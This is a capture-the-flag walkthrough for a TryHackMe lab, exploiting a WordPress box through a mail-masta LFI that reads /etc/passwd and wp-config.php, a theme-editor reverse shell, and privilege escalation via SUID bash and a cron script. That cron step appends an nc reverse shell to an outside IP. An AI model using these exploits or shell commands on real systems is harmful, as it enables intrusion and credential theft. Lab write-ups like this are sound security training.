# 18 - All in One

Room link --> [here](https://tryhackme.com/room/allinonemj)

## Enumeration

#### nmap scan

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap 10.10.123.230 -sS -T4 -Pn -n -p- -vv --min-rate 10000

# outputs
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
{% endcode %}

#### ffuf enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
ffuf -u http://10.10.123.230/FUZZ -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 400
# outputs..
wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 153ms]
hackathons              [Status: 200, Size: 197, Words: 19, Lines: 64, Duration: 152ms]

# /wordpress enumeration.
ffuf -u http://10.10.123.230/wordpress/FUZZ -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 400
# outputs..
wp-content
wp-includes
wp-admin
```
{% endcode %}

We discovered 2 results (wordpress and hackathons).

#### wpscan

{% code overflow="wrap" lineNumbers="true" %}
```bash
# enumerating usernames
wpscan --url http://10.10.123.230/wordpress --enumerate u, ap # ap is for allplugins.

# outputs
[i] User(s) Identified:
[+] elyana

# vulnerabilities:
# there is a mail-masta plugin that is vulnerable to LFI.
[i] Plugin(s) Identified:
[+] mail-masta
```
{% endcode %}

#### /hackathons

When navigating to "/hackathons":

{% code overflow="wrap" lineNumbers="true" %}
```bash
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
# the h1 tag says: Damn how much I hate the smell of Vinegar :/ !!!
# which suggest this is a vinegar cipher text.
```
{% endcode %}

Visit this site --> [https://cryptii.com/pipes/vigenere-cipher](https://cryptii.com/pipes/vigenere-cipher)

I used `Dvc W@iyur@123` as the cipher text and `KeepGoing` as key.

<figure><img src=".gitbook/assets/image (153).png" alt=""><figcaption><p>got the key.</p></figcaption></figure>

### Initial Access method 1

I tried the key: `H@ckme@123` and username `elyana` in the wp-adminn login page, and it worked.

### Initial Access method 2

We could also leverage the "mail-masta" plugin LFI vulnerability.

I did a `searchsploit mail masta` and got some results.

<figure><img src=".gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# exploit.
# we were able to execute cmds.
curl http://10.10.123.230/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
{% endcode %}

<figure><img src=".gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

We can try PHP filters on the LFI:

{% code overflow="wrap" lineNumbers="true" %}
```bash
curl http://10.10.123.230/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php

# outputs.
[..redacted..]5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==

# decode the base64 and gete the db creds, which are also the wordpress login creds.
echo '[..redacted..]5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==` | base64 -d

# outputs..
/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'PASSWORD' );
```
{% endcode %}

After login to the wordpress dashboard, goto "Appearance tab", "Theme Editor", then select the "404.php" and replace the php code with nishang reverse shell. Setup a nc listener to catch the shell.

<figure><img src=".gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

And we got a shell.

## Priv Esc

### Method 1

Finding SUID binaries..

{% code overflow="wrap" lineNumbers="true" fullWidth="false" %}
```bash
find / -user root -perm -4000 -exec ls -l {} \; 2>/dev/null

# outputs
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/chmod
-rwsr-sr-x 1 root root 400624 Apr  4  2018 /usr/bin/socat
```
{% endcode %}

"/bin/bash" stood out, we can execute bash with privileges.

`/bin/bash -p` .

<figure><img src=".gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

The flags are in base64 format.

### Method 2

`/bin/chmod` - we can just chmod for&#x20;

### Method 3

The socat binary: check gtfobin.

### Method 4

When you `cat /etc/crontab` - there is a script running every minute as root, and everyone has access and can modify it, so we just edit and put a reverse shell in it.

`echo "mkfifo /tmp/kirxhbg; nc 10.18.88.214 4445 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg" >> /var/backups/script.sh` .

### Method 5

#### Priv Esc from www-data to elyana

The hint.txt file in the elyana home directory says to look for elyana credentials which is hidden in the system somewhere. So the best way to do this is to find all files owned by "elyana" and is readable by the "www-data" user.

{% code overflow="wrap" lineNumbers="true" %}
```bash
find / -user elyana -type f -readable -exec ls -ald {} \; 2>/dev/null

# outputs
-rw-r--r-- 1 elyana elyana 220 Apr  4  2018 /home/elyana/.bash_logout
-rw-rw-r-- 1 elyana elyana 59 Oct  6  2020 /home/elyana/hint.txt
-rw-r--r-- 1 elyana elyana 807 Apr  4  2018 /home/elyana/.profile
-rw-r--r-- 1 elyana elyana 0 Oct  5  2020 /home/elyana/.sudo_as_admin_successful
-rw-r--r-- 1 elyana elyana 3771 Apr  4  2018 /home/elyana/.bashrc
-rwxrwxrwx 1 elyana elyana 34 Oct  5  2020 /etc/mysql/conf.d/private.txt
```
{% endcode %}

And there is a `/etc/mysql/conf.d/private.txt` file that contains credentials, tried it for ssh and it worked.

{% code overflow="wrap" lineNumbers="true" %}
```
bash-4.4$ cat /etc/mysql/conf.d/private.txt
cat /etc/mysql/conf.d/private.txt
user: elyana
password: E@syR18ght
```
{% endcode %}

#### Priv Esc from elyana to root

`sudo -l` - we can exploit the socat binary.











